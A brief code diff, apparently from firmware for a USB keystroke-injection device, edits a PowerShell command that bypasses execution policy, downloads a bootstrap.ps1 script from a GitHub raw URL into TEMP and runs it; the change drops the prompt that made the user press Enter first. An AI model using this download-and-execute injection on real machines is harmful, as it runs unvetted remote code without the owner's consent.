@@ -5,7 +5,7 @@
 // ── MODIFICA SOLO QUESTA RIGA ─────────────────────────────────────────────────
 static const char URL[] =
     "powershell -ExecutionPolicy Bypass -Command "
-    "\"$f=\\\"$env:TEMP\\\\bootstrap.ps1\\\"; iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1' -o $f; & $f; Read-Host 'Premi INVIO'\"";
+    "\"$f=\\\"$env:TEMP\\\\bootstrap.ps1\\\"; iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1' -o $f; & $f\"";
 // ────────────────────────────────────────────────────────────────────────────
 
 static constexpr uint32_t DELAY_HID_INIT   = 8000U;
